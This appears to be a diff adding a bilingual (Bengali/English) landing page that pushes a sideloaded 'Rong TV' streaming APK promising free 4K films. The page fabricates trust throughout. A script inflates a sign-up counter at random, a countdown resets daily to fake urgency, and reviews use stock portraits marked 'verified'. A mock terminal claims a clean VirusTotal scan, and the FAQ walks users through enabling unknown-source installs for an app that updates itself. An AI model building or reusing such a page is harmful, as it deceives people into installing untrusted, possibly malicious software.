+        <div class="rank" onclick="k2()"><span class="rank-num">04</span><div class="rank-thumb"><img src="img/4a.png" alt="Years Later" loading="lazy"><span class="rank-badge rb-4k" data-i18n="card_4k">4K</span></div><div class="rank-meta"><div class="rank-title">Years Later</div><div class="rank-rate"><b>4.5</b> · <span data-i18n="live_rating">রেটিং</span></div></div><span class="rank-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></span></div>
+        <div class="rank" onclick="k2()"><span class="rank-num">05</span><div class="rank-thumb"><img src="img/5a.png" alt="The Rip" loading="lazy"><span class="rank-badge rb-4k" data-i18n="card_hd">HD</span></div><div class="rank-meta"><div class="rank-title">The Rip</div><div class="rank-rate"><b>4.6</b> · <span data-i18n="live_rating">রেটিং</span></div></div><span class="rank-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></span></div>
+        <div class="rank" onclick="k2()"><span class="rank-num">06</span><div class="rank-thumb"><img src="img/6a.png" alt="Crime 101" loading="lazy"><span class="rank-badge rb-new" data-i18n="card_new">নতুন</span></div><div class="rank-meta"><div class="rank-title">Crime 101</div><div class="rank-rate"><b>4.8</b> · <span data-i18n="live_rating">রেটিং</span></div></div><span class="rank-arrow"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg></span></div>
+      </div>
+    </section>
+
+    <!-- FEATURES — editorial rows -->
+    <section class="sec">
+      <div class="sec-head">
+        <div class="eyebrow" data-i18n="feat_label">কেন Rong TV</div>
+        <h2 class="h2"><span data-i18n="feat_h_a">যা কিছু তোমার</span> <em data-i18n="feat_h_b">দরকার। যা দরকার নেই, তা নয়।</em></h2>
+      </div>
+      <div class="feat-row"><span class="feat-idx">01</span><div class="feat-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="4"/><polygon points="10 8 16 12 10 16 10 8" fill="currentColor" stroke="none"/></svg></div><div class="feat-txt"><h4 data-i18n="feat1_h">4K HDR</h4><p data-i18n="feat1_p">Dolby Vision ও Atmos। তোমার হাতে সিনেমা-মানের কোয়ালিটি।</p></div></div>
+      <div class="feat-row"><span class="feat-idx">02</span><div class="feat-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></div><div class="feat-txt"><h4 data-i18n="feat2_h">অফলাইন মোড</h4><p data-i18n="feat2_p">যেকোনো কিছু ডাউনলোড করুন। প্লেন, ট্রেন, যেকোনো জায়গায় দেখুন।</p></div></div>
+      <div class="feat-row"><span class="feat-idx">03</span><div class="feat-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg></div><div class="feat-txt"><h4 data-i18n="feat3_h">মাল্টি-ডিভাইস</h4><p data-i18n="feat3_p">ফোন, ট্যাব, টিভি — একটিতে থামান, অন্যটিতে চালিয়ে যান।</p></div></div>
+      <div class="feat-row"><span class="feat-idx">04</span><div class="feat-ic"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div><div class="feat-txt"><h4 data-i18n="feat4_h">আর্লি অ্যাক্সেস</h4><p data-i18n="feat4_p">এক্সক্লুসিভ প্রিমিয়ার ও পর্দার আড়ালের কনটেন্ট অন্যদের আগে।</p></div></div>
+    </section>
+
+    <!-- COMPARE — cost value -->
+    <section class="sec">
+      <div class="sec-head">
+        <div class="eyebrow" data-i18n="compare_label">তুলনা</div>
+        <h2 class="h2"><span data-i18n="compare_h_a">হিসাবটা</span> <em data-i18n="compare_h_b">সহজ</em></h2>
+        <p class="sub" data-i18n="compare_sub">Rong TV যখন ফ্রি করে, তখন টাকা দেবেন কেন?</p>
+      </div>
+      <div class="save-card">
+        <div class="save-big">
+          <div class="n">$0<span data-i18n="save_price">/ চিরকালের জন্য</span></div>
+          <div class="l" data-i18n="save_app">Rong TV · কোনো সাবস্ক্রিপশন নেই</div>
+        </div>
+        <div class="vs-row me"><span data-i18n="save_app2">Rong TV</span><b data-i18n="save_price">$0 / চিরকালের জন্য</b></div>
+        <div class="vs-row them"><span data-i18n="save_others">অন্য স্ট্রিমিং অ্যাপ</span><b data-i18n="save_others_price">$12–18 / মাস</b></div>
+        <div class="save-line"><span data-i18n="save_line">আপনি সাশ্রয় করেন</span> <b>≈ $180 / বছর</b></div>
+      </div>
+    </section>
+
+    <!-- TOGETHER — spotlight panel -->
+    <section class="sec">
+      <div class="tog">
+        <h3 data-i18n="bigfeat_h">⚡ একসাথে দেখুন, দূরে থেকেও</h3>
+        <div class="tog-list">
+          <div class="tog-i"><div class="tog-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div><span data-i18n="bigfeat_1"><strong>Sync Play</strong> — বন্ধুদের সাথে নিখুঁত সিঙ্কে দেখুন, বিশ্বের যেকোনো জায়গা থেকে</span></div>
+          <div class="tog-i"><div class="tog-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div><span data-i18n="bigfeat_2"><strong>৫টি প্রোফাইল</strong> — প্রতিটির জন্য ব্যক্তিগতকৃত সুপারিশ</span></div>
+          <div class="tog-i"><div class="tog-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div><span data-i18n="bigfeat_3"><strong>কিডস মোড</strong> — ছোটদের জন্য নিরাপদ, বাছাই করা কনটেন্ট</span></div>
+          <div class="tog-i"><div class="tog-check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div><span data-i18n="bigfeat_4"><strong>AI সাবটাইটেল</strong> — ৪০+ ভাষায় রিয়েল-টাইম অনুবাদ</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- REVIEWS — stacked quotes -->
+    <section class="sec">
+      <div class="sec-head">
+        <div class="eyebrow" data-i18n="reviews_label">লক্ষ লক্ষ মানুষের প্রিয়</div>
+        <h2 class="h2"><span data-i18n="reviews_h_a">আমাদের কথা</span> <em data-i18n="reviews_h_b">বিশ্বাস করবেন না</em></h2>
+      </div>
+      <div class="rev-score">
+        <div class="rev-num">4.8<span>রেটিং</span></div>
+        <div>
+          <div class="rev-stars"><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg><svg viewBox="0 0 20 20" fill="currentColor"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"/></svg></div>
+          <div class="rev-txt"><b>50M+</b> ডাউনলোড · <b>10K+</b> টাইটেল</div>
+        </div>
+      </div>
+      <div class="quote">
+        <div class="quote-mark">&ldquo;</div>
+        <p data-i18n="review1">"অবশেষে একটা অ্যাপ যা সত্যিই কথা রাখে। 4K কোয়ালিটি অসাধারণ আর অফলাইন ডাউনলোড আমার যাতায়াত বাঁচিয়েছে। বাকি সব বাতিল করে দিয়েছি।"</p>
+        <div class="quote-who"><div class="quote-av"><img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Sarah Mitchell" loading="lazy"></div><div class="quote-name">Sarah Mitchell <span>✓ <span data-i18n="verified_user">যাচাইকৃত ব্যবহারকারী</span></span></div></div>
+      </div>
+      <div class="quote">
+        <div class="quote-mark">&ldquo;</div>
+        <p data-i18n="review2">"মাল্টি-ডিভাইস সিঙ্ক নিখুঁত। টিভিতে শুরু করি, বিছানায় ফোনে শেষ করি। লাইব্রেরি বিশাল আর AI সুপারিশ ভয়ংকর ভালো।"</p>
+        <div class="quote-who"><div class="quote-av"><img src="https://randomuser.me/api/portraits/men/32.jpg" alt="James Rodriguez" loading="lazy"></div><div class="quote-name">James Rodriguez <span>✓ <span data-i18n="verified_user">যাচাইকৃত ব্যবহারকারী</span></span></div></div>
+      </div>
+      <div class="quote">
+        <div class="quote-mark">&ldquo;</div>
+        <p data-i18n="review3">"কিডস মোড জীবন বাঁচানো। আমার বাচ্চাদের নিজেদের জায়গা আছে আর তারা কী পাবে তা নিয়ে চিন্তা করতে হয় না। পরিবারের জন্য সেরা স্ট্রিমিং অ্যাপ, নিঃসন্দেহে।"</p>
+        <div class="quote-who"><div class="quote-av"><img src="https://randomuser.me/api/portraits/women/23.jpg" alt="Emily Chen" loading="lazy"></div><div class="quote-name">Emily Chen <span>✓ <span data-i18n="verified_user">যাচাইকৃত ব্যবহারকারী</span></span></div></div>
+      </div>
+    </section>
+
+    <!-- SECURITY — terminal -->
+    <section class="sec">
+      <div class="sec-head">
+        <div class="eyebrow" data-i18n="sec_label">নিরাপদ ও যাচাইকৃত</div>
+        <h2 class="h2"><span data-i18n="sec_h_a">আপনার নিরাপত্তা</span> <em data-i18n="sec_h_b">আমাদের অগ্রাধিকার</em></h2>
+        <p class="sub" data-i18n="sec_sub">প্রতিটি রিলিজ আপনার কাছে পৌঁছানোর আগে স্ক্যান, সাইন ও যাচাই করা হয়।</p>
+      </div>
+      <div class="term">
+        <div class="term-bar"><i></i><i></i><i></i><span>voltv — verify.apk</span></div>
+        <div class="term-body">
+          <div class="ln"><span class="prompt">$</span> vt-scan voltv.apk</div>
+          <div class="ok">✓ <b data-i18n="sec1_a">VirusTotal স্ক্যান করা</b> <span class="dim" data-i18n="sec1_b">· ১০০% পরিচ্ছন্ন · ৭২টি ইঞ্জিন পাস</span></div>
+          <div class="ok">✓ <b data-i18n="sec2_a">SHA-256 সাইন করা</b> <span class="dim" data-i18n="sec2_b">· ক্রিপ্টোগ্রাফিকভাবে যাচাইকৃত · টেম্পার-প্রুফ</span></div>
+          <div class="ok">✓ <b data-i18n="sec3_a">অটো-আপডেট</b> <span class="dim" data-i18n="sec3_b">· রিলিজের সাথে সাথেই সর্বশেষ ভার্সন</span></div>
+          <div class="ok">✓ <b data-i18n="sec4_a">পারমিশন অপব্যবহার নেই</b> <span class="dim" data-i18n="sec4_b">· শুধুমাত্র যা কঠোরভাবে প্রয়োজন</span></div>
+          <div class="ln">স্ক্যান সম্পূর্ণ — ০টি হুমকি পাওয়া গেছে<span class="term-cursor"></span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- CTA — spotlight -->
+    <section class="sec">
+      <div class="cta">
+        <div class="cta-icon"><img src="img/logo.jpg" alt="Rong TV"></div>
+        <h2><span data-i18n="hero_title_a">সিনেমা তোমার</span> <em data-i18n="hero_title_b">পকেটে</em></h2>
+        <p data-i18n="hero_desc">ব্লকবাস্টার স্ট্রিম করুন, সিরিজ দেখুন, অফলাইনে ডাউনলোড করুন — সবই stunning 4K HDR-এ। কোনো বিজ্ঞাপন নেই। কখনোই না।</p>
+        <button class="cta-btn" onclick="k2()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg><span data-i18n="hero_cta">ফ্রি ডাউনলোড — দেখা শুরু করুন</span></button>
+        <div class="cta-note">VirusTotal স্ক্যান করা · ১০০% পরিচ্ছন্ন</div>
+        <div class="guarantees">
+          <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> <span data-i18n="guarantee_1">ক্রেডিট কার্ড নেই</span></span>
+          <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> <span data-i18n="guarantee_2">বিজ্ঞাপন নেই, কখনোই</span></span>
+          <span><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg> <span data-i18n="guarantee_3">চিরকাল ফ্রি</span></span>
+        </div>
+      </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="sec">
+      <div class="sec-head">
+        <div class="eyebrow" data-i18n="faq_label">সাধারণ প্রশ্ন</div>
+        <h2 class="h2"><span data-i18n="faq_h_a">প্রশ্ন আছে?</span> <em data-i18n="faq_h_b">উত্তর আমাদের কাছে।</em></h2>
+      </div>
+      <div class="faqs">
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><span data-i18n="faq1_q">APK ইনস্টল করা কি নিরাপদ?</span><span class="faq-mark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq1_a">অবশ্যই। প্রতিটি রিলিজ প্রকাশের আগে VirusTotal স্ক্যানিং (৭২+ ইঞ্জিন), SHA-256 কোড সাইনিং এবং ম্যানুয়াল নিরাপত্তা পর্যালোচনার মধ্য দিয়ে যায়। আমরা কখনোই অ্যাডওয়্যার, স্পাইওয়্যার বা অবাঞ্ছিত সফটওয়্যার বান্ডল করি না। আমাদের নিরাপত্তা পেজে প্রকাশিত হ্যাশ ব্যবহার করে আপনি নিজেই সিগনেচার যাচাই করতে পারেন।</p></div></div>
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><span data-i18n="faq2_q">অ্যাপটি Google Play বা App Store-এ কেন নেই?</span><span class="faq-mark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq2_a">আমরা এখন দ্রুত পুনরাবৃত্তির পর্যায়ে আছি — প্রতি ২ সপ্তাহে নতুন ফিচার ও উন্নতি নিয়ে আপডেট প্রকাশ করছি। সরাসরি বিতরণ আমাদের অ্যাপ স্টোর পর্যালোচনার বিলম্ব ছাড়াই দ্রুত এগোতে দেয়। আমাদের ফিচার-কমপ্লিট মাইলস্টোনে পৌঁছালে ২০২৬ সালের শেষের দিকে অ্যাপ স্টোর তালিকা পরিকল্পিত। একই অ্যাপ, একই কোয়ালিটি, শুধু আপনার জন্য দ্রুত আপডেট।</p></div></div>
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><span data-i18n="faq3_q">অ্যান্ড্রয়েডে APK কীভাবে ইনস্টল করব?</span><span class="faq-mark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq3_a">১. উপরের Download APK বাটনে ট্যাপ করুন।<br>২. ডাউনলোড করা .apk ফাইলটি খুলুন।<br>৩. অনুরোধ এলে Settings → Security-তে "Install from unknown sources" অনুমতি দিন।<br>৪. Install ট্যাপ করুন এবং শেষ! এরপর অ্যাপ নিজেই অটো-আপডেট হবে — ভবিষ্যতের ভার্সন ম্যানুয়ালি ডাউনলোড করার দরকার নেই।</p></div></div>
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><span data-i18n="faq4_q">এটা কি সত্যিই ফ্রি? ফাঁদটা কী?</span><span class="faq-mark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq4_a">হ্যাঁ — ১০০% ফ্রি। কোনো লুকানো ফি নেই, জোরপূর্বক সাবস্ক্রিপশন নেই, কনটেন্টে পেওয়াল নেই। আমরা আমাদের ব্যবহারকারী ভিত্তি তৈরি করছি এবং বিশ্বাস করি যে সেরা স্ট্রিমিং অভিজ্ঞতা তৈরি করলে গ্রোথ আপনার পিছনে আসবে। প্রিমিয়াম ফিচার (অফলাইন ডাউনলোড এবং 4K-এর মতো) আমাদের লঞ্চ পিরিয়ডে ফ্রি। যতদিন থাকে উপভোগ করুন!</p></div></div>
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><span data-i18n="faq5_q">কোন ডিভাইস ও OS ভার্সন সমর্থিত?</span><span class="faq-mark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq5_a">APK-এর জন্য Android 8.0 (Oreo) এবং তার উপরে। IPA-এর জন্য iOS 14+। ফোন, ট্যাবলেট, Android TV এবং Fire TV Stick-এ কাজ করে। সেরা 4K স্ট্রিমিং অভিজ্ঞতার জন্য কমপক্ষে 2 GB RAM সুপারিশ করি। Chromecast এবং AirPlay সমর্থন অন্তর্ভুক্ত।</p></div></div>
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><span data-i18n="faq6_q">ইনস্টল করার পর আপডেট কীভাবে পাব?</span><span class="faq-mark"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg></span></button><div class="faq-a"><p data-i18n="faq6_a">অ্যাপে একটি অন্তর্নির্মিত অটো-আপডেটার আছে। নতুন ভার্সন এলে অ্যাপের ভেতরে নোটিফিকেশন পাবেন — শুধু "Update" ট্যাপ করুন, বাকিটা সে সামলে নেবে। এই পেজে আবার আসার বা ম্যানুয়ালি ডাউনলোড করার দরকার নেই। আমরা প্রায় প্রতি ২ সপ্তাহে ফিক্স ও নতুন ফিচার সহ আপডেট পুশ করি।</p></div></div>
+      </div>
+
+      <div class="foot">
+        <div class="foot-brand"><img src="img/logo.jpg" alt="Rong TV"><span>Volt<b>TV</b></span></div>
+        <div class="foot-links">
+          <a href="#" data-i18n="footer_priv">গোপনীয়তা</a>
+          <a href="#" data-i18n="footer_terms">শর্তাবলী</a>
+          <a href="#" data-i18n="footer_sec">নিরাপত্তা</a>
+        </div>
+        <div class="foot-copy"><span data-i18n="footer_copy">© ২০২৬ Rong TV</span></div>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- FIXED BOTTOM BAR -->
+<div class="instbar">
+  <div class="instbar-icon"><img src="img/logo.jpg" alt="Rong TV"></div>
+  <div class="instbar-meta">
+    <div class="instbar-name">Rong TV</div>
+    <div class="instbar-sub"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.8 · 50M+</div>
+  </div>
+  <button class="instbar-btn" onclick="k2()" data-i18n="float_cta">ফ্রি ডাউনলোড</button>
+</div>
+
+<script>
+/* ---- FAQ ---- */
+function toggleFaq(q){var p=q.closest('.faq');var was=p.classList.contains('open');document.querySelectorAll('.faq').forEach(function(i){i.classList.remove('open')});if(!was)p.classList.add('open')}
+
+/* ---- countdown (resets daily) ---- */
+function pad(n){return n<10?'0'+n:''+n}
+function tickCountdown(){
+  var now=new Date(), end=new Date();
+  end.setHours(23,59,59,999);
+  var d=end-now; if(d<=0){end.setDate(end.getDate()+1); d=end-now;}
+  var h=Math.floor(d/3600000), m=Math.floor(d%3600000/60000), s=Math.floor(d%60000/1000);
+  var v={hh:h,mm:m,ss:s};
+  document.querySelectorAll('[data-cd]').forEach(function(el){el.textContent=pad(v[el.getAttribute('data-cd')])});
+}
+tickCountdown(); setInterval(tickCountdown,1000);
+
+/* ---- social proof counter ---- */
+var joined=12483;
+function fmt(n){return n.toLocaleString('en-US')}
+function bumpJoined(){joined+=Math.floor(Math.random()*3)+1; var el=document.querySelector('[data-joined]'); if(el)el.textContent=fmt(joined)}
+setInterval(bumpJoined,4200);
+</script>
+
+<script>
+(function(){
+var T={
+en:{
+hero_eyebrow:'#1 Entertainment App · 2026',hero_title_a:'Cinema in your',hero_title_b:'pocket',hero_desc:'Stream blockbusters, binge series, download for offline — all in stunning 4K HDR. No ads. Ever.',hero_stat1:'Active Users',hero_stat2:'App Store',hero_stat3:'Quality',hero_cta:'Download Free — Start Watching',scroll_hint:'Swipe',trending_label:'Trending Now',trending_h_a:'What the world',trending_h_b:'is watching',trending_sub:'Top picks, updated daily',card_hot:'HOT',card_new:'NEW',card_top:'TOP',card_4k:'4K',card_hd:'HD',live_titles:'Titles',live_rating:'Rating',live_downloads:'Downloads',feat_label:'Why Rong TV',feat_h_a:'Everything you',feat_h_b:"need. Nothing you don't.",feat1_h:'4K HDR',feat1_p:'Dolby Vision & Atmos. Cinema-grade quality in your hands.',feat2_h:'Offline Mode',feat2_p:'Download anything. Watch on planes, trains, anywhere.',feat3_h:'Multi-Device',feat3_p:'Phone, tablet, TV — pause on one, resume on another.',feat4_h:'Early Access',feat4_p:'Exclusive premieres & behind-the-scenes before anyone else.',bigfeat_h:'⚡ Watch together, even apart',bigfeat_1:'<strong>Sync Play</strong> — watch in perfect sync with friends, anywhere in the world',bigfeat_2:'<strong>5 Profiles</strong> — each with personalized recommendations',bigfeat_3:'<strong>Kids Mode</strong> — safe, curated content for the little ones',bigfeat_4:'<strong>AI Subtitles</strong> — real-time translation in 40+ languages',reviews_label:'Loved by Millions',reviews_h_a:"Don't take our",reviews_h_b:'word for it',review1:'"Finally an app that actually delivers. The 4K quality is insane and offline downloads saved my commute. Cancelled everything else."',review2:'"Multi-device sync is flawless. I start on my TV, finish on my phone in bed. The library is massive and the AI recommendations are scary good."',review3:'"Kids Mode is a lifesaver. My children have their own space and I don\'t worry about what they\'ll find. Best streaming app for families hands down."',verified_user:'Verified User',stat1:'Downloads Worldwide',stat1_desc:'Downloads Worldwide',stat2:'Average Rating',stat3:'Countries Available',stat4:'Uptime Guarantee',sec_label:'Safe & Verified',sec_h_a:'Your security',sec_h_b:'is our priority',sec_sub:'Every release is scanned, signed, and verified before it reaches you.',sec1_a:'VirusTotal Scanned',sec1_b:'100% clean · 72 engines passed',sec2_a:'SHA-256 Signed',sec2_b:'Cryptographically verified · tamper-proof',sec3_a:'Auto-Update',sec3_b:'Get the latest version as soon as we release',sec4_a:'No Permissions Abuse',sec4_b:"Only requests what's strictly needed",faq_label:'FAQ',faq_h_a:'Got questions?',faq_h_b:"We've got answers.",faq1_q:'Is the APK safe to install?',faq1_a:'Absolutely. Every release goes through VirusTotal scanning (72+ engines), SHA-256 code signing, and manual security review before publication. We never bundle adware, spyware, or unwanted software. You can verify the signature yourself using the hash published on our security page.',faq2_q:"Why isn't the app on Google Play or App Store?",faq2_a:"We're currently in a rapid iteration phase — shipping updates every 2 weeks with new features and improvements. Direct distribution lets us move faster without app store review delays. App store listings are planned for late 2026 once we hit our feature-complete milestone. Same app, same quality, just faster updates for you.",faq3_q:'How do I install the APK on Android?',faq3_a:'1. Tap the Download APK button above.<br>2. Open the downloaded .apk file.<br>3. If prompted, allow "Install from unknown sources" in Settings → Security.<br>4. Tap Install and you\'re done! The app will auto-update itself after that — no need to manually download future versions.',faq4_q:"Is it really free? What's the catch?",faq4_a:"Yes — 100% free. No hidden fees, no forced subscriptions, no paywalls on content. We're building our user base and believe that if we make the best streaming experience, growth follows. Premium features (like offline downloads and 4K) are also free during our launch period. Enjoy it while it lasts!",faq5_q:'Which devices and OS versions are supported?',faq5_a:'Android 8.0 (Oreo) and above for the APK. iOS 14+ for the IPA. Works on phones, tablets, Android TV, and Fire TV Stick. We recommend at least 2 GB of RAM for the best 4K streaming experience. Chromecast and AirPlay support are built in.',faq6_q:'How do I get updates after installing?',faq6_a:'The app has a built-in auto-updater. When a new version is available, you\'ll get a notification inside the app — just tap "Update" and it handles everything. No need to revisit this page or manually download again. We push updates every ~2 weeks with fixes and new features.',footer_copy:'© 2026 Rong TV',footer_priv:'Privacy',footer_terms:'Terms',footer_sec:'Security',float_cta:'Download Free',offer_tag:'Launch Offer',offer_txt:'Premium free — ends in',joined_today:'joined today',compare_label:'Compare',compare_h_a:'The math is',compare_h_b:'simple',compare_sub:'Why pay when Rong TV does it free?',save_app:'Rong TV · no subscription',save_app2:'Rong TV',save_price:'$0 / forever',save_others:'Other streaming apps',save_others_price:'$12–18 / month',save_line:'You save',guarantee_1:'No credit card',guarantee_2:'No ads, ever',guarantee_3:'Free forever'
+},
+bn:{
+hero_eyebrow:'#১ বিনোদন অ্যাপ · ২০২৬',hero_title_a:'সিনেমা তোমার',hero_title_b:'পকেটে',hero_desc:'ব্লকবাস্টার স্ট্রিম করুন, সিরিজ দেখুন, অফলাইনে ডাউনলোড করুন — সবই stunning 4K HDR-এ। কোনো বিজ্ঞাপন নেই। কখনোই না।',hero_stat1:'সক্রিয় ব্যবহারকারী',hero_stat2:'অ্যাপ স্টোর',hero_stat3:'কোয়ালিটি',hero_cta:'ফ্রি ডাউনলোড — দেখা শুরু করুন',scroll_hint:'সোয়াইপ',trending_label:'এখন ট্রেন্ডিং',trending_h_a:'পৃথিবী যা',trending_h_b:'দেখছে',trending_sub:'সেরা পছন্দ, প্রতিদিন আপডেট',card_hot:'হট',card_new:'নতুন',card_top:'টপ',card_4k:'4K',card_hd:'HD',live_titles:'টাইটেল',live_rating:'রেটিং',live_downloads:'ডাউনলোড',feat_label:'কেন Rong TV',feat_h_a:'যা কিছু তোমার',feat_h_b:'দরকার। যা দরকার নেই, তা নয়।',feat1_h:'4K HDR',feat1_p:'Dolby Vision ও Atmos। তোমার হাতে সিনেমা-মানের কোয়ালিটি।',feat2_h:'অফলাইন মোড',feat2_p:'যেকোনো কিছু ডাউনলোড করুন। প্লেন, ট্রেন, যেকোনো জায়গায় দেখুন।',feat3_h:'মাল্টি-ডিভাইস',feat3_p:'ফোন, ট্যাব, টিভি — একটিতে থামান, অন্যটিতে চালিয়ে যান।',feat4_h:'আর্লি অ্যাক্সেস',feat4_p:'এক্সক্লুসিভ প্রিমিয়ার ও পর্দার আড়ালের কনটেন্ট অন্যদের আগে।',bigfeat_h:'⚡ একসাথে দেখুন, দূরে থেকেও',bigfeat_1:'<strong>Sync Play</strong> — বন্ধুদের সাথে নিখুঁত সিঙ্কে দেখুন, বিশ্বের 